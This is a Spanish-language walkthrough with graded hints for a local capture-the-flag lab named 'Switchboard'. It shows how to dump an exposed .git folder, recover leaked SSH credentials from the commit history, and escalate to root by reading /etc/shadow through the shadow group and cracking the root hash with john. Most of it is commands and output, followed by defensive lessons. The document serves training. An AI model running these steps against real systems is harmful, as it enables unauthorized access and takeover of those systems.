# 🧭 Guía por pistas — Switchboard

Guía de resolución por **pistas progresivas**. Cada etapa tiene tres niveles:

- **Pista 1** — empujón conceptual (qué buscar, sin el cómo).
- **Pista 2** — la técnica o herramienta concreta.
- **Pista 3** — el comando exacto.

Abrí solo la que necesites. Al final está el **walkthrough completo**, colapsado,
para verificar tu solución cuando termines.

> Punto de partida: `http://127.0.0.1:8082` (HTTP) y `ssh -p 2224` (SSH).
> Reemplazá `127.0.0.1:8082` por la IP:puerto que estés usando.

---

## Etapa 0 · Reconocimiento

<details>
<summary><b>Pista 1</b> — ¿por dónde entro?</summary>

Dos servicios: un servidor web y SSH. El SSH no te sirve todavía porque no tenés
credenciales. Todo arranca por el **web**. Mapeá puertos, versión del servidor y **qué rutas
y archivos existen** — prestando atención a carpetas de control de versiones que no deberían
estar publicadas.

</details>

<details>
<summary><b>Pista 2</b> — herramientas</summary>

- Escaneo de puertos/servicios: `nmap`.
- Descubrimiento de contenido: `gobuster`, `feroxbuster` o `ffuf`.
- Un clásico que SIEMPRE conviene probar: ¿existe `/.git/`? Es el error de despliegue más
  común y más jugoso.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
nmap -sC -sV -p- 127.0.0.1 -oN nmap.txt      # (o la IP del contenedor)

# ¿está publicada la carpeta de git?
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8082/.git/HEAD
curl -s http://127.0.0.1:8082/.git/          # listado del directorio
```

</details>

---

## Etapa 1 · Dump del repositorio `.git`

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

El sitio dejó la carpeta `.git/` publicada. Eso es **todo el repositorio**: código, ramas e
**historial completo**. Aunque la web actual se vea limpia, el historial puede guardar cosas
que alguien creyó haber borrado.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Reconstruí el repo en tu máquina. Con el listado de directorio activo te alcanza con un
*mirror* recursivo (`wget -r`); lo más cómodo es **`git-dumper`**, que arma el repo aunque no
haya listado. Una vez reconstruido, es un repo git normal: `git log`, `git show`, `git diff`.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
# opción A: git-dumper (pip install git-dumper)
git-dumper http://127.0.0.1:8082/.git/ repo

# opción B: mirror recursivo
wget -q -r -np -nH "http://127.0.0.1:8082/.git/" -P repo
cd repo && git checkout -- . 2>/dev/null

git log --oneline        # mirá los mensajes de commit
```

</details>

---

## Etapa 2 · El secreto en el historial

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

En `git log` hay un commit que **agrega** un script de despliegue y, justo después, otro que
lo "quita por tener credenciales". El archivo ya no está en el árbol actual… pero el commit
que lo agregó **sigue en el historial**. Ahí está la credencial.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Mirá el diff del commit que agregó el script con `git show`. Vas a ver un usuario y una
contraseña en claro. Esa contraseña está **reutilizada** como credencial de SSH del sistema.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
git log --oneline
# cc63e57 fix: quitar credenciales del repo
# 1e74c92 add: script de despliegue   <-- este
# 74e62de init: panel de operaciones

git show 1e74c92            # (o: git show HEAD~1)
#  -> SSH_USER="operator"
#  -> SSH_PASS="superman"
```

</details>

---

## Etapa 3 · Acceso inicial por SSH

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

Tenés usuario y contraseña. Probálos tal cual contra el SSH del lab.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Login por contraseña (no hace falta clave). Una vez dentro, lo primero: `id`. Fijate a qué
**grupos** pertenecés — ahí está la pista de la escalada.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
ssh -p 2224 operator@127.0.0.1      # contraseña: superman
cat ~/user.txt
id                                  # mirá los grupos...
```

</details>

---

## Etapa 4 · Escalada por abuso del grupo `shadow`

<details>
<summary><b>Pista 1</b> — qué buscar</summary>

`id` te muestra que `operator` está en el grupo **`shadow`**. Ese grupo no da root directo,
pero sí un permiso carísimo: **leer `/etc/shadow`**, el archivo con los hashes de todas las
contraseñas, incluida la de root.

</details>

<details>
<summary><b>Pista 2</b> — la técnica</summary>

Leé `/etc/shadow`, quedate con la línea de `root` y crackeá su hash **offline** con `john` +
`rockyou.txt` (es un hash `sha512crypt`, prefijo `$6$`; en `john` es el formato
`sha512crypt`). Con la contraseña de root, `su root`.

</details>

<details>
<summary><b>Pista 3</b> — comandos</summary>

```bash
# dentro del lab: confirmás el acceso de lectura
ls -l /etc/shadow            # -rw-r----- root shadow  <-- el grupo shadow puede leerlo
grep '^root:' /etc/shadow

# copiás esa línea a tu máquina y la crackeás con john
echo 'root:$6$....' > root.hash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt root.hash
john --show root.hash

# de vuelta en el lab:
su root            # contraseña crackeada
id                 # uid=0(root)
cat /root/root.txt
```

</details>

---

<details>
<summary><h2>🏁 Walkthrough completo (SPOILER — abrí solo para verificar)</h2></summary>

### Reconocimiento
```bash
nmap -sC -sV -p- 127.0.0.1
# 80/tcp  Apache httpd 2.4 (Debian)
# 22/tcp  OpenSSH
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8082/.git/HEAD   # 200
```

### Etapa 1 — dump de .git
```bash
git-dumper http://127.0.0.1:8082/.git/ repo      # o wget -r del .git/
cd repo
git log --oneline
# cc63e57 fix: quitar credenciales del repo
# 1e74c92 add: script de despliegue
# 74e62de init: panel de operaciones
```

### Etapa 2 — secreto en el historial
```bash
git show 1e74c92
# + SSH_USER="operator"
# + SSH_PASS="superman"
```

### Etapa 3 — acceso inicial
```bash
ssh -p 2224 operator@127.0.0.1        # superman
cat ~/user.txt
id
# uid=1000(operator) ... groups=...,42(shadow)
```

### Etapa 4 — escalada por grupo shadow
```bash
grep '^root:' /etc/shadow > root.hash         # el grupo shadow puede leerlo
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt root.hash
# root : iloveyou
su root                                        # iloveyou
id                                             # uid=0(root)
cat /root/root.txt
```

### Resumen de credenciales
| Elemento | Valor |
|:---------|:------|
| Credencial filtrada (git) | `operator:superman` |
| Usuario SSH | `operator` |
| Grupo abusado | `shadow` (lectura de `/etc/shadow`) |
| Contraseña de root (crackeada) | `iloveyou` |

### Lecciones (lado defensivo)
- Nunca desplegar la carpeta `.git/` a producción; bloqueala en el servidor o excluila del build.
- Un secreto commiteado **no** se borra quitándolo en un commit posterior: queda en el
  historial. Hay que **rotar la credencial** y reescribir el historial (`git filter-repo`).
- No reutilizar contraseñas entre servicios/sistemas.
- El grupo `shadow` (y otros grupos sensibles: `disk`, `docker`, `lxd`, `adm`) concede
  accesos equivalentes a root. No metas usuarios de servicio en ellos; audita con `getent group`.
- Contraseña de root fuerte y fuera de diccionario: si el hash se filtra, que no caiga con `rockyou`.

</details>
